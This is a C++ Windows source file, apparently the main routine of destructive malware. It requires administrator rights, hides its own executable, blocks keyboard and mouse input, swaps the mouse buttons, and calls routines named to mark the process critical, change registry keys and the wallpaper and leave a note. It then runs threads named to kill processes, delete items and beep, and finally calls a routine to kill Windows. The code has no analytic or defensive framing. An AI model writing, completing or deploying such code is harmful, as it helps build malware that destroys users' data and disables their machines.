#include <Windows.h>
#include <shlwapi.h>
#include <string>
#include <random>
#include <thread>

#include "shared.h"
#include "_main.h"

#pragma comment(lib, "Shlwapi.lib")

using std::wstring;
using std::string;
using std::thread;

const char* error_occurred = "An error occurred";

void static close_mutex(HANDLE& mutex) {
	if (!mutex) return;

	CloseHandle(mutex);
	mutex = nullptr;
}

extern "C" int WINAPI wWinMain(
	_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ PWSTR pCmdLine,
	_In_ int nCmdShow
) {
	HANDLE token = NULL;
	BOOL admin = FALSE;

	TOKEN_ELEVATION elevation = {};
	DWORD elevation_size = sizeof(TOKEN_ELEVATION);

	HANDLE proc = GetCurrentProcess();
	BOOL opened = OpenProcessToken(proc, TOKEN_QUERY, &token);

	if (!opened) {
		MessageBoxA(
			NULL,
			"Failed to check required permissions.",
			"Insufficient permissions",
			MB_OK | MB_ICONEXCLAMATION
		);

		return EXIT_FAILURE;
	}

	BOOL got_info = GetTokenInformation(
		token, TokenElevation,
		&elevation, elevation_size,
		&elevation_size
	);

	if (got_info) {
		admin = elevation.TokenIsElevated;
	}

	CloseHandle(token);

	if (!admin) {
		MessageBoxA(
			NULL,
			"Please re-run as administrator.",
			"Insufficient permissions",
			MB_OK | MB_ICONEXCLAMATION
		);

		return EXIT_FAILURE;
	}

	HANDLE mutex = CreateMutexA(
		NULL, FALSE,
		shared::MUTEX_NAME
	);

	DWORD error = GetLastError();
	if (error == ERROR_ALREADY_EXISTS) {
		MessageBoxA(
			NULL,
			shared::MUTEX_ERROR_BODY,
			shared::MUTEX_ERROR_TITLE,
			MB_OK | MB_ICONEXCLAMATION
		);
		
		return EXIT_FAILURE;
	}

	wchar_t exe_path[MAX_PATH];
	DWORD exe_len = GetModuleFileNameW(NULL, exe_path, MAX_PATH);

	if (exe_len == 0 || exe_len == MAX_PATH) {
		MessageBoxA(
			NULL,
			"Failed to get module file name",
			error_occurred,
			MB_OK | MB_ICONERROR
		);

		return EXIT_FAILURE;
	}

	BOOL hidden = SetFileAttributesW(
		exe_path,
		FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM
	);

	if (!hidden) {
		MessageBoxA(
			NULL,
			"Failed to set attributes",
			error_occurred,
			MB_OK | MB_ICONERROR
		);

		return EXIT_FAILURE;
	}

	BlockInput(TRUE);

	main::critical();
	main::wallpaper();
	main::reg_keys();
	main::note();

	SystemParametersInfoW(
		SPI_SETMOUSEBUTTONSWAP,
		TRUE, NULL,
		SPIF_SENDCHANGE
	);

	std::this_thread::sleep_for(
		std::chrono::seconds(10)
	);

	BlockInput(FALSE);

	thread kill_all(main::kill_all_t);
	thread del_items(main::del_items_t);
	thread beep(main::beep_t);

	kill_all.join();
	del_items.join();
	beep.join();

	std::this_thread::sleep_for(
		std::chrono::minutes(2)
	);

	main::kill_windows();

	return EXIT_SUCCESS;
}